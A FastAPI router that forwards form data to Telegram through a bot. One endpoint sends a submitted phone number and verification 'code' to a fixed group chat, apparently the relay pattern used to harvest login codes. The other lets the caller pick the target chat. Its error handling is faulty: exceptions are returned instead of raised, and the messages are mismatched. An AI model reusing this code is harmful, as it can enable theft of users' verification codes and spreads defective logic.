from fastapi import APIRouter, HTTPException, status
import requests
from aiogram.exceptions import TelegramBadRequest
from bot.commands import bot
from bot.schemas import Code, GrokSchema



router = APIRouter()



@router.post("/any")
async def send_code(payload: Code):

    try:
        await bot.send_message(chat_id=-974972939, 
                               text=f"phone: {payload.phone}\ncode: {payload.text}",
                               parse_mode='HTML')
        return {
            "message": "Уведомление успешно отправлено",
            "code" : 2
        }
    except TelegramBadRequest as e:
        return HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail=str(e))
    
    except requests.RequestException as e:
        return HTTPException(status_code=status.HTTP_500_INTERNAL_SERVER_ERROR, detail="Ошибка при получении orders_chat_id")


@router.post("/grok")
async def send_case(payload: GrokSchema):
    caption = (
        f"📩 <b>Новое Обращение</b>\n"
        f"👤 Имя: {payload.name}\n"
        f"📱 Телефон: {payload.phone}\n"
        f"<b>————————————————</b>\n"
        f"💬 Сообщение: {payload.message}"
    )


    try:
        await bot.send_message(chat_id=str(payload.chat_id), 
                               text=caption,
                               parse_mode='HTML')
        return {
            "message": "Уведомление успешно отправлено",
            "code" : 2
        }
    except TelegramBadRequest as e:
        return HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail=str(e))
    
    except requests.RequestException as e:
        return HTTPException(status_code=status.HTTP_500_INTERNAL_SERVER_ERROR, detail="Ошибка при получении orders_chat_id")    